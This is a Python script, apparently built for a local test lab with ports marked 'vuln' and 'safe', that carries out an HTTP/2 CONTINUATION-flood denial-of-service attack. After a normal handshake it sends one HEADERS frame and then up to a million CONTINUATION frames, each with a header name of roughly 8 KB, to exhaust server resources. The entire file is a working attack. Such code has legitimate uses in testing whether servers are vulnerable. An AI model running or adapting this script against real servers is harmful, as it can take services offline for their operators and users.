import socket
import ssl
from hpack import Encoder
import asyncio

# Frame type definitions
FRAME_TYPE_HEADERS = 1
FRAME_TYPE_RST_STREAM = 3
FRAME_TYPE_SETTINGS = 4
FRAME_TYPE_GOAWAY = 7
FRAME_TYPE_CONTINUATION = 9
# Flag definitions
FLAG_SETTINGS_ACK = 0x01

target = {'port': 3392, 'protocol': 'http'}  # vuln
# target = {'port': 3393, 'protocol': 'https'}  # vuln
# target = {'port': 3394, 'protocol': 'http'}  # safe
# target = {'port': 3395, 'protocol': 'https'}  # safe

def build_frame(frame_type, flags, stream_id, payload):
    length = len(payload)
    header = bytearray(9)
    header[0:3] = length.to_bytes(3, 'big')
    header[3] = frame_type
    header[4] = flags
    header[5:9] = (stream_id & 0x7FFFFFFF).to_bytes(4, 'big')
    return header + payload

def encode_headers(headers):
    encoder = Encoder()
    encoded = encoder.encode(headers.items())
    return encoded

async def attack_one_connection():
    setting_ack_received = False
    setting_ack_send = False

    port = target['port']
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    def send(sock, data):
        sock.sendall(data)

    def get_frames(data):
        frames = []
        offset = 0
        while offset < len(data):
            length = int.from_bytes(data[offset:offset+3], 'big')
            frame_type = data[offset+3]
            flags = data[offset+4]
            stream_id = int.from_bytes(data[offset+5:offset+9], 'big') & 0x7FFFFFFF
            offset += 9
            payload = data[offset:offset+length] if length > 0 else bytearray()
            offset += length
            frames.append({'type': frame_type, 'flags': flags, 'stream_id': stream_id, 'payload': payload})
        return frames

    async def handle_connection(sock):
        nonlocal setting_ack_received, setting_ack_send

        while not setting_ack_received or not setting_ack_send:
            await asyncio.sleep(0.1)
            data = sock.recv(65535)
            if data:
                frames = get_frames(data)
                for frame in frames:
                    if frame['type'] == FRAME_TYPE_SETTINGS:
                        if frame['flags'] == 0x00:
                            ack_settings_frame = build_frame(FRAME_TYPE_SETTINGS, FLAG_SETTINGS_ACK, 0x00, bytearray())
                            send(sock, ack_settings_frame)
                            setting_ack_send = True
                        elif frame['flags'] == 0x01:
                            setting_ack_received = True
                    elif frame['type'] in {FRAME_TYPE_GOAWAY, FRAME_TYPE_RST_STREAM}:
                        sock.close()
                        return

    with socket.create_connection(('localhost', port)) as sock:
        if target['protocol'] == 'https':
            sock = context.wrap_socket(sock, server_hostname='localhost')

        print('Connected to the server.')
        
        connection_preface = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
        send(sock, connection_preface)

        settings_frame = build_frame(FRAME_TYPE_SETTINGS, 0x00, 0x00, bytearray())
        send(sock, settings_frame)

        await handle_connection(sock)

        header_payload = encode_headers({
            ':path': '/',
            ':method': 'GET',
            ':authority': f'localhost:{port}',
            ':scheme': target['protocol'],
        })
        headers_frame = build_frame(FRAME_TYPE_HEADERS, 0x00, 0x01, header_payload)
        send(sock, headers_frame)

        for i in range(1, 1000001):
            if i % 1000 == 0:
                print(i)
            header_name = 'a' * 8190 + str(i)
            cont_payload = encode_headers({header_name: ''})
            cont_frame = build_frame(FRAME_TYPE_CONTINUATION, 0x00, 0x01, cont_payload)
            send(sock, cont_frame)
            await asyncio.sleep(0)

        while True:
            data = sock.recv(65535)
            if data:
                frames = get_frames(data)
                for frame in frames:
                    if frame['type'] == FRAME_TYPE_SETTINGS:
                        if frame['flags'] == 0x00:
                            ack_settings_frame = build_frame(FRAME_TYPE_SETTINGS, FLAG_SETTINGS_ACK, 0x00, bytearray())
                            send(sock, ack_settings_frame)
                            setting_ack_send = True
                        elif frame['flags'] == 0x01:
                            setting_ack_received = True
                    elif frame['type'] in {FRAME_TYPE_GOAWAY, FRAME_TYPE_RST_STREAM}:
                        sock.close()
                        return

async def main():
    await attack_one_connection()

asyncio.run(main())
